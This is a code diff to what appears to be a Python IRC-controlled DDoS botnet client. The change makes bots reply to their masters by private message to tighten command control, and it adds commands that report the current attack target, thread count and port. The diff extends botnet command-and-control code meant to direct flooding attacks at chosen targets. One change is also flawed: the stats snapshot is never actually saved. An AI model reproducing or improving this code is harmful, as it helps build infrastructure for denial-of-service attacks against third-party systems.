@@ -22,6 +22,21 @@ if platform.system() == "Windows": # Requests doesn't work on Windows
 else:
     import requests
 
+# Notes
+
+    """
+    Problem: Anyone can issue commands (by  abusing masters' 
+    nicks), as the bots don't recognize operators.
+    
+    Solution: The bots don't really need to talk inside the 
+    control channel, they can use private messages to talk to
+    the masters only. Thus the solution is simply +m and 
+    private messages instead of channel messages*.
+            Simply: Bots don't use channel messages, but 
+                    private message the masters instead.
+    * see (Ctrl+F) mark1
+    """
+
 # Aesthetics
 
 if platform.system() == "Windows": # Colors doesn't work on Windows
@@ -71,9 +86,16 @@ def fail(msg):
 global target
 global threads
 global port
+global previous
 target = None
 threads = None
 port = None
+
+def get_previous():
+    previous = {'target': target, 'threads': threads, 'port': port}
+    return previous
+
+previous = get_previous()
 
 # Config
 
@@ -92,7 +114,7 @@ except Exception as e:
 
 # Version
 
-version = "0.2.1"
+version = "0.2.2"
 
 # Argparse
 
@@ -145,7 +167,7 @@ def getip():
 if native_ip == "0":
     warning(lang["unativeip"])
     time.sleep(2)
-    print(getip())
+    native_ip = getip()
 
 print(lang["ynativeip"] + native_ip)
 
@@ -203,7 +225,6 @@ channel = config["channel"]
 password = ""
 
 try:
-    
     s.connect((ircd, ircport))
     s = ssl.wrap_socket(s)
     
@@ -219,7 +240,12 @@ s.send("USER " + username + " 0 * :" + realname + "\r\n")
 
 # Message-sending
 def message(msg):
-    s.send("PRIVMSG " + channel + " :" + msg + "\r\n")
+    #s.send("PRIVMSG " + channel + " :" + msg + "\r\n")
+    # mark1
+    privmessage(botmaster, msg)
+    privmessage(masterbot, msg)
+    for admin in admins:
+        privmessage(admin, msg)
     if msg == "Stopping the attack":
         print(bcolors.OKGREEN + nickname+" ("+lang["senderyou"]+"): " + bcolors.ENDC + lang["stopattck"])
     elif "is up for me." in msg:
@@ -366,6 +392,7 @@ while 1:
                     message("Incorrect !ping format.")
                     print(e)
         if sentmessage == "!stop":
+            get_previous()
             claudiashammer.stop_now = True
             message("Stopping the attack")
             target = None
@@ -389,3 +416,11 @@ while 1:
             message("Ohai " + auth + "!")
         if sentmessage == "Ahoy " + nickname + "!":
             message("Ohai " + auth + "!")
+        if sentmessage == "!version":
+            message(version)
+        if sentmessage == "!stats":
+            if previous["threads"] is not None:
+                message("s:" + previous["threads"])
+        if sentmessage == "!allstats":
+            if previous["threads"] is not None:
+                message("as:" + previous["target"] + ":" + previous["threads"] + ":" + previous["port"])
